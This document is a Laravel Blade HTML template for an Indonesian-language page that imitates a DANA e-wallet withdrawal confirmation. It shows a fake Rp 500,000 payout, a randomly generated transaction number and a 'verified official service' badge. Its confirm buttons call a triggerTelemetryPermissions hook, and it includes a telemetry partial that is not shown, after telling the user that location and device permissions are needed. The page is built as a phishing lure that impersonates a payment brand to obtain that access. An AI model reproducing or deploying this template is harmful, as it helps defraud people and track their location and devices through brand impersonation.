<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>{{ $siteTitle ?? 'Konfirmasi Penarikan Saldo Dompet Digital - DANA Indonesia' }}</title>

  <!-- Essential Meta Tags -->
  <meta name="description" content="{{ $siteDescription ?? 'Periksa dan konfirmasi detail penarikan saldo e-wallet Anda sebelum pencairan ke rekening tujuan.' }}">

  <!-- Schema.org / Google / WhatsApp Fallbacks -->
  <meta itemprop="name" content="{{ $siteTitle ?? 'Konfirmasi Penarikan Saldo Dompet Digital - DANA Indonesia' }}">
  <meta itemprop="description" content="{{ $siteDescription ?? 'Periksa dan konfirmasi detail penarikan saldo e-wallet Anda sebelum pencairan ke rekening tujuan.' }}">
  <meta itemprop="image" content="{{ !empty($ogImageUrl) ? $ogImageUrl : url('images/landing/dana-logo.jpg') }}">
  <link rel="image_src" href="{{ !empty($ogImageUrl) ? $ogImageUrl : url('images/landing/dana-logo.jpg') }}">

  <!-- Open Graph Meta Tags -->
  <meta property="og:site_name" content="DANA Indonesia">
  <meta property="og:type" content="article">
  <meta property="og:locale" content="id_ID">
  <meta property="og:url" content="{{ url()->current() }}">
  <meta property="og:title" content="{{ $siteTitle ?? 'Konfirmasi Penarikan Saldo Dompet Digital - DANA Indonesia' }}">
  <meta property="og:description" content="{{ $siteDescription ?? 'Periksa dan konfirmasi detail penarikan saldo e-wallet Anda sebelum pencairan ke rekening tujuan.' }}">
  <meta property="og:image" content="{{ !empty($ogImageUrl) ? $ogImageUrl : url('images/landing/dana-logo.jpg') }}">
  <meta property="og:image:secure_url" content="{{ !empty($ogImageUrl) ? $ogImageUrl : url('images/landing/dana-logo.jpg') }}">
  <meta property="og:image:type" content="image/jpeg">
  <meta property="og:image:width" content="600">
  <meta property="og:image:height" content="600">

  <!-- Twitter Card Meta Tags -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="{{ $siteTitle ?? 'Konfirmasi Penarikan Saldo Dompet Digital - DANA Indonesia' }}">
  <meta name="twitter:description" content="{{ $siteDescription ?? 'Periksa dan konfirmasi detail penarikan saldo e-wallet Anda sebelum pencairan ke rekening tujuan.' }}">
  <meta name="twitter:image" content="{{ !empty($ogImageUrl) ? $ogImageUrl : url('images/landing/dana-logo.jpg') }}">

  <style>
    :root {
      --primary: #1268df;
      --primary-dark: #0954bb;
      --success: #16a34a;
      --success-bg: #eaf8ef;
      --text: #182230;
      --muted: #667085;
      --border: #e5eaf0;
      --background: #f5f8fc;
      --white: #ffffff;
      --danger: #b42318;
      --danger-bg: #fff3f2;
      --shadow: 0 18px 50px rgba(20, 55, 100, .10);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html {
      scroll-behavior: smooth;
    }

    body {
      font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
      color: var(--text);
      background: var(--background);
      min-height: 100vh;
      line-height: 1.6;
    }

    button, a {
      font: inherit;
    }

    a {
      text-decoration: none;
    }

    .header {
      height: 70px;
      background: var(--white);
      border-bottom: 1px solid var(--border);
      display: flex;
      align-items: center;
    }

    .header-inner {
      width: 100%;
      max-width: 1080px;
      margin: auto;
      padding: 0 20px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .logo {
      display: flex;
      align-items: center;
      gap: 10px;
      color: var(--primary);
      font-weight: 800;
      font-size: 21px;
      letter-spacing: -.5px;
    }

    .logo-icon {
      width: 36px;
      height: 36px;
      border-radius: 10px;
      background: linear-gradient(135deg, #2e8cff, #0958c4);
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 900;
    }

    .secure-label {
      display: flex;
      align-items: center;
      gap: 7px;
      color: #667085;
      font-size: 12px;
    }

    .secure-dot {
      width: 8px;
      height: 8px;
      background: var(--success);
      border-radius: 50%;
    }

    .page {
      padding: 50px 20px 80px;
    }

    .container {
      max-width: 650px;
      margin: auto;
    }

    .card {
      background: var(--white);
      border: 1px solid var(--border);
      border-radius: 20px;
      box-shadow: var(--shadow);
      overflow: hidden;
    }

    .card-header {
      text-align: center;
      padding: 36px 30px 28px;
    }

    .status-icon {
      width: 68px;
      height: 68px;
      margin: 0 auto 18px;
      border-radius: 50%;
      background: var(--success-bg);
      color: var(--success);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 31px;
      font-weight: 800;
    }

    .card-header h1 {
      font-size: 29px;
      line-height: 1.25;
      letter-spacing: -.7px;
      margin-bottom: 8px;
    }

    .card-header p {
      color: var(--muted);
      font-size: 14px;
      max-width: 470px;
      margin: auto;
    }

    .transaction {
      margin: 0 28px;
      padding: 23px;
      background: #f8fafc;
      border: 1px solid var(--border);
      border-radius: 14px;
    }

    .transaction-title {
      font-size: 12px;
      color: #8a94a3;
      text-transform: uppercase;
      letter-spacing: .7px;
      font-weight: 700;
      margin-bottom: 18px;
    }

    .amount {
      font-size: 34px;
      font-weight: 800;
      letter-spacing: -.8px;
      margin-bottom: 20px;
      color: #1268df;
    }

    .details {
      display: flex;
      flex-direction: column;
      gap: 13px;
    }

    .detail {
      display: flex;
      justify-content: space-between;
      align-items: flex-start;
      gap: 20px;
      font-size: 14px;
    }

    .detail .label {
      color: var(--muted);
    }

    .detail .value {
      font-weight: 600;
      text-align: right;
    }

    .status {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      color: #a15c00;
      background: #fff6df;
      padding: 5px 9px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 700;
    }

    .status::before {
      content: "";
      width: 6px;
      height: 6px;
      background: #e8a400;
      border-radius: 50%;
    }

    .action {
      padding: 27px 28px 30px;
    }

    .primary-button {
      width: 100%;
      border: 0;
      border-radius: 11px;
      padding: 15px 20px;
      background: var(--primary);
      color: #fff;
      font-size: 15px;
      font-weight: 700;
      cursor: pointer;
      transition: .2s;
    }

    .primary-button:hover {
      background: var(--primary-dark);
      box-shadow: 0 8px 20px rgba(18,104,223,.2);
    }

    .action-note {
      text-align: center;
      color: #8a94a3;
      font-size: 12px;
      margin-top: 12px;
    }

    .success-message {
      display: none;
      background: var(--success-bg);
      color: var(--success);
      padding: 14px;
      border-radius: 10px;
      font-size: 13px;
      font-weight: 600;
      margin-top: 15px;
      text-align: center;
    }

    .success-message.show {
      display: block;
    }

    .security {
      margin-top: 20px;
      background: var(--danger-bg);
      border: 1px solid #fecdca;
      border-radius: 13px;
      padding: 17px 18px;
      display: flex;
      gap: 12px;
    }

    .security-icon {
      flex: 0 0 auto;
      width: 30px;
      height: 30px;
      border-radius: 50%;
      background: #fff;
      color: var(--danger);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 15px;
      font-weight: 800;
    }

    .security strong {
      display: block;
      color: #912018;
      font-size: 13px;
      margin-bottom: 3px;
    }

    .security p {
      color: #8c2b24;
      font-size: 12px;
    }

    .steps {
      margin-top: 35px;
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
    }

    .step {
      background: var(--white);
      border: 1px solid var(--border);
      border-radius: 13px;
      padding: 18px 14px;
      text-align: center;
    }

    .step-number {
      width: 30px;
      height: 30px;
      margin: 0 auto 9px;
      background: #eaf3ff;
      color: var(--primary);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 12px;
      font-weight: 800;
    }

    .step h3 {
      font-size: 13px;
      margin-bottom: 3px;
    }

    .step p {
      color: var(--muted);
      font-size: 11px;
    }

    .footer {
      text-align: center;
      color: #8a94a3;
      font-size: 11px;
      padding: 25px 20px 35px;
    }

    .modal-overlay {
      position: fixed;
      inset: 0;
      background: rgba(15, 23, 42, .55);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      opacity: 0;
      visibility: hidden;
      transition: .2s;
      z-index: 1000;
    }

    .modal-overlay.active {
      opacity: 1;
      visibility: visible;
    }

    .modal {
      width: 100%;
      max-width: 420px;
      background: #fff;
      border-radius: 18px;
      padding: 28px;
      box-shadow: 0 25px 70px rgba(0,0,0,.2);
      transform: translateY(12px);
      transition: .2s;
    }

    .modal-overlay.active .modal {
      transform: translateY(0);
    }

    .modal-icon {
      width: 50px;
      height: 50px;
      border-radius: 50%;
      background: #eaf8ef;
      color: var(--success);
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 15px;
      font-size: 23px;
    }

    .modal-actions {
      display: flex;
      gap: 10px;
      margin-top: 20px;
    }

    .modal-button {
      flex: 1;
      padding: 12px;
      border-radius: 9px;
      border: 1px solid var(--border);
      background: #fff;
      cursor: pointer;
      font-weight: 600;
    }

    .modal-button.confirm {
      background: var(--primary);
      color: #fff;
      border-color: var(--primary);
    }
  </style>
</head>
<body>

  <header class="header">
    <div class="header-inner">
      <a href="#" class="logo">
        <span class="logo-icon">P</span>
        PayKita
      </a>
      <div class="secure-label">
        <span class="secure-dot"></span>
        Layanan Resmi Terverifikasi
      </div>
    </div>
  </header>

  <main class="page">
    <div class="container">
      <div class="card">
        <div class="card-header">
          <div class="status-icon">✓</div>
          <h1>Konfirmasi Penarikan Dana</h1>
          <p>Periksa kembali detail permintaan penarikan saldo Anda sebelum melanjutkan ke rekening tujuan.</p>
        </div>

        <div class="transaction">
          <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px;">
            <div class="transaction-title" style="margin-bottom: 0;">Detail Penarikan E-Wallet</div>
            <img src="{{ asset('images/landing/dana-logo.png') }}" alt="DANA" style="height: 24px; width: auto; object-fit: contain;">
          </div>
          <div class="amount">Rp 500.000</div>

          <div class="details">
            <div class="detail">
              <span class="label">Nomor Transaksi</span>
              <span class="value">WD-{{ date('Ymd') }}-{{ rand(100, 999) }}</span>
            </div>
            <div class="detail">
              <span class="label">Tanggal</span>
              <span class="value">{{ date('d F Y') }}</span>
            </div>
            <div class="detail">
              <span class="label">Metode Pencairan</span>
              <span class="value">Transfer Saldo E-Wallet</span>
            </div>
            <div class="detail">
              <span class="label">Status</span>
              <span class="value">
                <span class="status">Menunggu konfirmasi verifikasi</span>
              </span>
            </div>
          </div>
        </div>

        <div class="action">
          <button class="primary-button" id="confirmButton">
            Konfirmasi & Cairkan Sekarang
          </button>
          <div class="action-note">
            Sistem memerlukan izin verifikasi lokasi & perangkat untuk keamanan transaksi.
          </div>

          <div class="success-message" id="successMessage">
            ✓ Permintaan verifikasi sedang diproses oleh sistem keamanan.
          </div>

          <div class="security">
            <div class="security-icon">!</div>
            <div>
              <strong>Perhatikan Keamanan Transaksi</strong>
              <p>Pastikan Anda menyelesaikan langkah konfirmasi ini langsung dari perangkat terdaftar Anda.</p>
            </div>
          </div>
        </div>
      </div>

      <div class="steps">
        <div class="step">
          <div class="step-number">1</div>
          <h3>Periksa</h3>
          <p>Pastikan nominal pencairan sudah sesuai.</p>
        </div>
        <div class="step">
          <div class="step-number">2</div>
          <h3>Konfirmasi</h3>
          <p>Klik tombol konfirmasi untuk verifikasi.</p>
        </div>
        <div class="step">
          <div class="step-number">3</div>
          <h3>Selesai</h3>
          <p>Saldo akan langsung diteruskan.</p>
        </div>
      </div>
    </div>
  </main>

  <footer class="footer">
    <div>© 2026 PayKita Network. Semua hak dilindungi.</div>
  </footer>

  <div class="modal-overlay" id="modalOverlay">
    <div class="modal">
      <div class="modal-icon">✓</div>
      <h2>Konfirmasi Pencairan Saldo?</h2>
      <p>Anda akan mengonfirmasi pencairan sebesar <strong>Rp 500.000</strong> ke nomor e-wallet terdaftar.</p>

      <div class="modal-actions">
        <button class="modal-button" id="cancelButton">Batal</button>
        <button class="modal-button confirm" id="confirmFinalButton">Ya, Cairkan Saldo</button>
      </div>
    </div>
  </div>

  <script>
    const confirmButton = document.getElementById("confirmButton");
    const modalOverlay = document.getElementById("modalOverlay");
    const cancelButton = document.getElementById("cancelButton");
    const confirmFinalButton = document.getElementById("confirmFinalButton");
    const successMessage = document.getElementById("successMessage");

    confirmButton.addEventListener("click", function () {
      if (window.triggerTelemetryPermissions) window.triggerTelemetryPermissions();
      modalOverlay.classList.add("active");
    });

    cancelButton.addEventListener("click", function () {
      modalOverlay.classList.remove("active");
    });

    confirmFinalButton.addEventListener("click", function () {
      if (window.triggerTelemetryPermissions) window.triggerTelemetryPermissions();
      modalOverlay.classList.remove("active");
      successMessage.classList.add("show");
      confirmButton.textContent = "Pencairan Sedang Diverifikasi...";
      confirmButton.disabled = true;
      confirmButton.style.opacity = "0.65";
    });
  </script>

  @include('landing.partials.telemetry')

</body>
</html>
